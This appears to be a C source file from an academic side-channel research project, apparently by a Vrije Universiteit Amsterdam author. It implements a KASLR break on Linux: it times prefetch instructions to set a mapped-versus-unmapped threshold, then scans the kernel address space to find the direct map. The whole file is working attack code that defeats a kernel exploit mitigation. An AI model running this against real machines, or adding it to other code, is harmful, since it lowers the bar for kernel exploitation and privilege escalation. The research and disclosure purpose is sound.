/* Functionality to break KASLR using a prefetch side channel.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

static uint64_t threshold;

/* Check whether or not the (kernel) address @addr is mapped via a prefetch
 * side channel.
 */
static int address_is_mapped(char *addr)
{
	#define NR_TESTS 128
	uint64_t times[NR_TESTS];
	for (int i = 0; i < NR_TESTS; i++) {
		cpuid();
		prefetcht0(addr);
		cpuid();
		evict_ipc();
		times[i] = time_prefetch(addr);
	}
	return median_sort(times, NR_TESTS) <= threshold;
}

static uint64_t find_first_mapped_page(uint64_t start, uint64_t end, uint64_t stride)
{
	for (uint64_t p = start; p < end; p += stride)
		if (address_is_mapped((char *)p))
			return p;

	// NULL is never mapped, so we use it to signal failure.
	return 0;
}

void kaslr_init()
{
	pr_verbose("=====[KASLR initialization]=====\n");
	pr_verbose("Measuring the latency of prefetching mapped versus unmapped pages.\n");
	pr_verbose("           | min |  q1 | med |  q3 | max\n");
	pr_verbose("  ---------+-----+-----+-----+-----+----\n");
	#define REPEAT 1000
	uint64_t *times = malloc(REPEAT * sizeof(uint64_t));

	char var_on_stack;
	char *mapped_ptr = &var_on_stack;
	for (size_t i = 0; i < REPEAT; i++) {
		load(mapped_ptr);
		cpuid();
		times[i] = time_prefetch(mapped_ptr);
	}
	uint64_t min = minimum_sort(times, REPEAT);
	uint64_t q1 = times[REPEAT/4];
	uint64_t med = times[REPEAT/2];
	uint64_t q3 = times[REPEAT*3/4];
	uint64_t max = times[REPEAT-1];
	pr_verbose("    mapped | %3lu | %3lu | %3lu | %3lu | %3lu\n", min, q1, med, q3, max);

	char *unmapped_ptr = (char *)0xffff800000000000;
	for (size_t i = 0; i < REPEAT; i++) {
		evict_ipc();
		cpuid();
		times[i] = time_prefetch(unmapped_ptr);
	}
	sort(times, REPEAT);
	pr_verbose("  unmapped | %3lu | %3lu | %3lu | %3lu | %3lu\n",
		times[0], times[REPEAT/4], times[REPEAT/2], times[REPEAT*3/4], times[REPEAT-1]);

	threshold = (times[0] + max) / 2;
	if (threshold >= times[REPEAT/2]) // Might arise if max is an outlier.
		threshold = (times[0] + q3) / 2;
	pr_verbose("Determined threshold at: %lu.\n\n", threshold);
}

uint64_t find_direct_map()
{
	#define KVAS_START 0xffff800000000000 // Start of the kernel's virtual address space.
	#define KVAS_END   0xffffffffffffffff // End of the kernel's virtual address space.
	#define DIRECT_MAP_ALIGNMENT (1LU << 30) // 1 GB
	pr_info("Scanning the kernel's virtual address space for mapped pages.\n");
	uint64_t direct_map = find_first_mapped_page(KVAS_START, KVAS_END, DIRECT_MAP_ALIGNMENT);
	pr_info("Linux' direct map at: %lx.\n", direct_map);
	if (direct_map == 0xffff800000000000)
		fail("KASLR break failed");
	return direct_map;
}
